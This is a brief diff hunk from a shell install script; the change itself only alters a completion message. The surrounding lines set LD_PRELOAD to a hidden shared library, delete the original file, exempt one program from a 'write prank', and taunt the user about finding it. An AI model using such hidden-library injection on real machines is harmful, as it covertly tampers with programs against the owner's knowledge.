@@ -33,7 +33,7 @@ rm -f "$SOURCE_SO"
 export LD_PRELOAD="$HIDDEN_SO"
 alias geary='DISABLE_WRITE_PRANK=1 geary'
 
-echo "[✓] Install complete."
+echo "[*] Install complete."
 echo "[!] Original .so deleted, have fun trying to find it ;)"
 #echo "Your .so file is now hidden at: $HIDDEN_SO"
 
